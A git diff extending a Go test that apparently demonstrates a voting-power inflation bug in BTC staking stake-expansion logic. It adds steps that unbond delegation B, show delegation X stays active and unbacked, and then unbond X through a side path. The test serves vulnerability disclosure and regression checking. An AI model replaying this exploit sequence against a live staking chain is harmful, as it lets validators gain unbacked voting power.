@@ -2343,4 +2343,100 @@ func TestUndelegateBTCExpansionOutputMismatch(t *testing.T) {
 	require.Greater(t, bVP, uint64(0), "B has voting power")
 	t.Logf("EXPLOIT: X voting power = %d, B voting power = %d, total = %d (should be only %d)",
 		xVP, bVP, xVP+bVP, bVP)
+
+	// ----------------------------------------------------------------
+	// Step 10: Unbond B normally via its registered unbonding tx
+	//
+	// B is now ACTIVE with covenant + delegator sigs on its unbonding tx
+	// (collected during stake-expansion setup in Step 5). Anyone can submit
+	// MsgBTCUndelegate(B, B_unbondingTx, proof) to unbond B — there is no
+	// restriction blocking this, and the call goes through the non-expansion
+	// branch (B's unbondingTx is not itself a registered delegation).
+	//
+	// Crucially, this does NOT fix X. X stays ACTIVE because nothing in this
+	// flow touches X's state.
+	// ----------------------------------------------------------------
+	bStakingTx := bDel.MustGetStakingTx()
+	bUnbondingTx := bDel.MustGetUnbondingTx()
+	serializedBUnbondingTxWithWitness, _ := datagen.AddWitnessToUnbondingTx(
+		t,
+		bStakingTx.TxOut[bDel.StakingOutputIdx],
+		delSK,
+		covenantSKs,
+		bsParams.CovenantQuorum,
+		[]*btcec.PublicKey{fpPK},
+		stakingTime,
+		bStakingValue,
+		bUnbondingTx,
+		h.Net,
+	)
+
+	bUnbondingTxParsed, err := bbn.NewBTCTxFromBytes(serializedBUnbondingTxWithWitness)
+	require.NoError(t, err)
+	bUnbondingInclusionProof := h.BuildBTCInclusionProofForSpendingTx(r, bUnbondingTxParsed, lcTip)
+
+	unbondBMsg := &types.MsgBTCUndelegate{
+		Signer:                        bDel.StakerAddr,
+		StakingTxHash:                 bStakingSlashingInfo.StakingTx.TxHash().String(),
+		StakeSpendingTx:               serializedBUnbondingTxWithWitness,
+		StakeSpendingTxInclusionProof: bUnbondingInclusionProof,
+		FundingTransactions:           [][]byte{bDel.StakingTx},
+	}
+
+	_, err = h.MsgServer.BTCUndelegate(h.Ctx, unbondBMsg)
+	require.NoError(t, err, "B should be unbondable normally via its registered unbonding tx")
+
+	// B is now UNBONDED
+	bDel, err = h.BTCStakingKeeper.GetBTCDelegation(h.Ctx, bStakingSlashingInfo.StakingTx.TxHash().String())
+	require.NoError(t, err)
+	require.True(t, bDel.IsUnbondedEarly(), "B must be early-unbonded after the follow-up call")
+
+	// X is STILL ACTIVE — unbonding B does not retroactively fix X
+	xDel, err = h.BTCStakingKeeper.GetBTCDelegation(h.Ctx, xStakingTxHash)
+	require.NoError(t, err)
+	xStatus, err = h.BTCStakingKeeper.BtcDelStatus(h.Ctx, xDel, bsParams.CovenantQuorum, lcTip)
+	require.NoError(t, err)
+	require.Equal(t, types.BTCDelegationStatus_ACTIVE, xStatus,
+		"X remains ACTIVE even after B is unbonded — there is no recovery path for X")
+
+	xVPAfter := bDel.VotingPower(lcTip, bsParams.CovenantQuorum, bsParams.CovenantQuorum)
+	bVPAfter := bDel.VotingPower(lcTip, bsParams.CovenantQuorum, bsParams.CovenantQuorum)
+	xVPAfter = xDel.VotingPower(lcTip, bsParams.CovenantQuorum, 0)
+	t.Logf("AFTER UNBONDING B: X voting power = %d (still ACTIVE, unbacked), B voting power = %d, total = %d",
+		xVPAfter, bVPAfter, xVPAfter+bVPAfter)
+
+	// ----------------------------------------------------------------
+	// Step 11: After B is unbonded, X CAN be unbonded via MsgBTCUndelegate(X, B_tx).
+	//
+	// The expansion-activation branch is gated on !IsUnbondedEarly() (see
+	// msg_server.go:547-549). Once B is unbonded-early, that branch is
+	// skipped and the call falls into the non-expansion path:
+	//   - inclusion proof of B_tx is verified directly (B_tx is on BTC)
+	//   - findInputIdx(B_tx, X_tx_hash, X.StakingOutputIdx) returns 0
+	//     (B_tx.TxIn[0] spends X's staking output)
+	//   - VerifySpendStakeTxStakerSig passes on TxIn[0] (covenant+staker
+	//     unbonding-path witness is valid)
+	//   - spendStakeTxHash != X's registered unbondingTxHash → default branch
+	//   - btcUndelegate(X) → X becomes UNBONDED
+	// ----------------------------------------------------------------
+	unbondXMsg := &types.MsgBTCUndelegate{
+		Signer:                        xDel.StakerAddr,
+		StakingTxHash:                 xStakingTxHash,
+		StakeSpendingTx:               spendingTxWithWitnessBz,
+		StakeSpendingTxInclusionProof: expansionTxInclusionProof,
+		FundingTransactions:           [][]byte{xDel.StakingTx, aFundingTxBz},
+	}
+	_, err = h.MsgServer.BTCUndelegate(h.Ctx, unbondXMsg)
+	require.NoError(t, err, "MsgBTCUndelegate(X, B_tx) should succeed once B is unbonded-early — expansion branch is skipped")
+
+	// X is now UNBONDED. Inflation is resolved.
+	xDel, err = h.BTCStakingKeeper.GetBTCDelegation(h.Ctx, xStakingTxHash)
+	require.NoError(t, err)
+	require.True(t, xDel.IsUnbondedEarly(),
+		"X must be early-unbonded after the non-expansion path is unlocked by B's unbonding")
+
+	xVPFinal := xDel.VotingPower(lcTip, bsParams.CovenantQuorum, 0)
+	bVPFinal := bDel.VotingPower(lcTip, bsParams.CovenantQuorum, bsParams.CovenantQuorum)
+	t.Logf("AFTER UNBONDING X: X voting power = %d, B voting power = %d, total = %d (inflation resolved)",
+		xVPFinal, bVPFinal, xVPFinal+bVPFinal)
 }
